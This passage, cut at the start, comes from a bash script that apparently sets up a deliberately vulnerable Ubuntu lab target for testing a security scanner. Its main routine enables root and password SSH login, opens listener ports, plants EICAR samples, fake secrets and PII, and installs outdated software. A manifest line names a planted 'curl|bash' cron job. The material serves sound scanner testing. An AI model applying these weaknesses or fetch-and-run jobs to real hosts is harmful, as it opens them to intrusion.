        echo "----------------------------------------------"
        if cfg_bool ".ssh.enabled"; then
            cfg_bool ".ssh.password_auth" && echo "  - SSH: PasswordAuthentication=yes"
            cfg_bool ".ssh.permit_root_login" && echo "  - SSH: PermitRootLogin=yes"
        fi
        cfg_bool ".findings.cron_jobs.enabled" && echo "  - Suspicious cron job (curl|bash)"
        cfg_bool ".findings.world_writable.enabled" && echo "  - World-writable file: $DEMO_DIR/shared-config.txt"
        if [ ${#DEMO_PORTS[@]} -gt 0 ]; then
            echo "  - ${#DEMO_PORTS[@]} non-standard listening ports"
        fi
        echo ""
        echo "----------------------------------------------"
        echo "  KEV-TRIGGER PACKAGES (check-kev.sh)"
        echo "----------------------------------------------"
        if [ -f "$DEMO_DIR/kev-trigger-packages.txt" ]; then
            while IFS= read -r line; do
                [[ "$line" =~ ^#|^$ ]] && continue
                echo "  $line"
            done < "$DEMO_DIR/kev-trigger-packages.txt"
        else
            echo "  (no KEV trigger manifest found)"
        fi
        echo "  NOTE: KEV matches depend on NVD lookup finding CVEs"
        echo "  for these specific versions. Older ISO = more hits."
        echo ""
        echo "----------------------------------------------"
        echo "  INSTALLED SOFTWARE"
        echo "----------------------------------------------"
        local browser
        while IFS= read -r browser; do
            [ -z "$browser" ] && continue
            local ver
            ver=$("$browser" --version 2>/dev/null || echo "not installed")
            echo "  $browser: $ver"
        done < <(cfg_array ".packages.browsers")
        echo "  OpenSSL:  $(openssl version 2>/dev/null || echo 'not installed')"
        if [ -f "$DEMO_DIR/installed-packages.txt" ]; then
            echo "  Total packages: $(wc -l < "$DEMO_DIR/installed-packages.txt" 2>/dev/null | tr -d ' ')"
        fi
        echo ""
        echo "----------------------------------------------"
        echo "  CONFIG & LOGS"
        echo "----------------------------------------------"
        echo "  Config:  $CONFIG_FILE"
        echo "  Log:     $LOG_FILE"
        echo ""
        echo "=============================================="
        echo "  Compare this manifest against .scans/ output"
        echo "  to verify scanner detection coverage."
        echo "  Each execution is unique — ports, filenames,"
        echo "  PII records, and malware samples are random."
        echo "=============================================="
    } > "$manifest"

    log_success "Verification manifest: $manifest"
    echo ""
    cat "$manifest"
}

# ============================================================================
# Main
# ============================================================================

main() {
    echo ""
    echo -e "${BOLD}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}║     JSON-Driven Payload Preparation           ║${NC}"
    echo -e "${BOLD}║     Security Toolkit - Target Setup            ║${NC}"
    echo -e "${BOLD}╚══════════════════════════════════════════════╝${NC}"
    echo ""

    check_root

    # Parse arguments
    CONFIG_FILE="$DEFAULT_CONFIG"
    local do_cleanup=false

    while [ $# -gt 0 ]; do
        case "$1" in
            --config|-c)
                if [ -z "${2:-}" ]; then
                    log_error "--config requires a path argument"
                    exit 1
                fi
                CONFIG_FILE="$2"
                shift 2
                ;;
            --cleanup)
                do_cleanup=true
                shift
                ;;
            --help|-h)
                echo "Usage: sudo $0 [OPTIONS]"
                echo ""
                echo "Options:"
                echo "  --config, -c FILE   Use custom JSON payload config"
                echo "                      (default: data/payload-default.json)"
                echo "  --cleanup           Tear down planted findings and listeners"
                echo "  --help, -h          Show this help"
                echo ""
                echo "Examples:"
                echo "  sudo $0                              # Default payload"
                echo "  sudo $0 --config custom.json         # Custom payload"
                echo "  sudo $0 --cleanup                    # Clean up"
                exit 0
                ;;
            *)
                log_error "Unknown argument: $1 (use --help for usage)"
                exit 1
                ;;
        esac
    done

    # Initialize session log
    mkdir -p "$DEMO_DIR"
    : > "$LOG_FILE"
    {
        echo "# Payload Setup Log"
        echo "# Started: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
        echo "# Hostname: $(hostname)"
        echo "# Config: $CONFIG_FILE"
        echo ""
    } >> "$LOG_FILE"

    # Handle cleanup mode
    if [ "$do_cleanup" = true ]; then
        cleanup
    fi

    # Install jq first (needed for everything else)
    ensure_jq

    # Validate config
    validate_config "$CONFIG_FILE"

    local start_time
    start_time=$(date +%s)

    echo -e "${BOLD}Phase 1: SSH Server${NC}"
    echo "-------------------"
    setup_ssh
    echo ""

    echo -e "${BOLD}Phase 2: Scan Dependencies${NC}"
    echo "-------------------------"
    install_scan_deps
    echo ""

    echo -e "${BOLD}Phase 3: Attack Surface (ports from config)${NC}"
    echo "--------------------------------------------"
    open_demo_ports
    echo ""

    echo -e "${BOLD}Phase 4: Planted Findings (from config)${NC}"
    echo "---------------------------------------"
    plant_findings
    echo ""

    echo -e "${BOLD}Phase 5: Malware Samples${NC}"
    echo "------------------------"
    plant_malware_samples
    echo ""

    echo -e "${BOLD}Phase 6: Outdated Software${NC}"
    echo "--------------------------"
    install_outdated_software
    echo ""

    echo -e "${BOLD}Phase 7: KEV Triggers${NC}"
    echo "---------------------"
    plant_kev_triggers
    echo ""

    echo -e "${BOLD}Phase 8: Verification Manifest${NC}"
    echo "------------------------------"
    generate_manifest
    echo ""

    local end_time elapsed
    end_time=$(date +%s)
    elapsed=$((end_time - start_time))
    local ip
    ip=$(get_ip)
    local eicar_count=0
    if [ -f "$DEMO_DIR/malware-samples.txt" ]; then
        eicar_count=$(wc -l < "$DEMO_DIR/malware-samples.txt" | tr -d ' ')
        # Subtract header lines
        eicar_count=$((eicar_count - 4))
        [ "$eicar_count" -lt 0 ] && eicar_count=0
    fi
    local port_count=${#DEMO_PORTS[@]}

    # Summary
    echo -e "${BOLD}══════════════════════════════════════════════${NC}"
    echo -e "${GREEN}${BOLD}  TARGET READY${NC}"
    echo -e "${BOLD}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${BOLD}Payload:${NC}          $(jq -r '.payload.name // "unnamed"' "$CONFIG_FILE")"
    echo -e "  ${BOLD}Config:${NC}           $(basename "$CONFIG_FILE")"
    echo -e "  ${BOLD}Target IP:${NC}        $ip"
    if cfg_bool ".ssh.enabled"; then
        local summary_users
        summary_users=$(jq -r '.ssh.users // [] | .[].name' "$CONFIG_FILE" 2>/dev/null | tr '\n' ',' | sed 's/,$//')
        echo -e "  ${BOLD}SSH:${NC}              Port $(cfg_num ".ssh.port" 22) (users: ${summary_users:-root})"
    fi
    if cfg_bool ".apache.enabled" && command -v apache2 &>/dev/null; then
        echo -e "  ${BOLD}Apache:${NC}           Port 80 (KEV trigger)"
    fi
    if [ -n "$DEMO_HTTP_PORT" ]; then
        echo -e "  ${BOLD}HTTP:${NC}             Port $DEMO_HTTP_PORT"
    fi
    if [ "$port_count" -gt 0 ]; then
        echo -e "  ${BOLD}Listeners:${NC}        ${DEMO_PORTS[*]}"
    fi
    echo -e "  ${BOLD}Planted files:${NC}    $DEMO_DIR/"
    echo -e "  ${BOLD}Setup time:${NC}       ${elapsed}s"
    echo ""
    echo -e "  ${BOLD}Expected scan findings:${NC}"
    cfg_bool ".findings.pii.enabled" && \
        echo -e "    ${RED}■${NC} PII:         SSNs, phone numbers, credit cards"
    cfg_bool ".findings.secrets.enabled" && \
        echo -e "    ${RED}■${NC} Secrets:     API keys, passwords, private key"
    cfg_bool ".findings.malware_samples.enabled" && \
        echo -e "    ${RED}■${NC} Malware:     $eicar_count EICAR test samples (random locations)"
    cfg_bool ".findings.mac_addresses.enabled" && \
        echo -e "    ${RED}■${NC} MAC addrs:   Random planted addresses"
    [ "$port_count" -gt 0 ] && \
        echo -e "    ${RED}■${NC} Ports:       $port_count configured listeners"
    echo -e "    ${YELLOW}■${NC} Host:        Weak SSH config, running services"
    echo -e "    ${YELLOW}■${NC} Lynis:       Multiple findings on stock Ubuntu"
    echo ""
    echo -e "  ${BOLD}Verification:${NC}"
    echo -e "    cat $DEMO_DIR/MANIFEST.txt"
    echo ""
    echo -e "  ${BOLD}Session log:${NC}"
    echo -e "    cat $LOG_FILE"
    echo ""
    echo -e "  ${BOLD}From Kali scanner:${NC}"
    echo -e "    ./scripts/run-all-scans.sh $DEMO_DIR"
    echo -e "    ${BOLD}OR${NC}"
    echo -e "    ./QuickStart.sh → Remote → $ip"
    echo ""
    echo -e "  ${BOLD}Cleanup:${NC}"
    echo -e "    sudo $0 --cleanup"
    echo -e "    ${BOLD}OR${NC} just reboot (live boot = nothing persists)"
    echo ""

    # Final log entry
    {
        echo ""
        echo "[$(date -u +%H:%M:%S)] [DONE] Setup completed in ${elapsed}s"
        echo "[$(date -u +%H:%M:%S)] [DONE] Target IP: $ip"
        echo "[$(date -u +%H:%M:%S)] [DONE] Config: $CONFIG_FILE"
    } >> "$LOG_FILE"
}

main "$@"
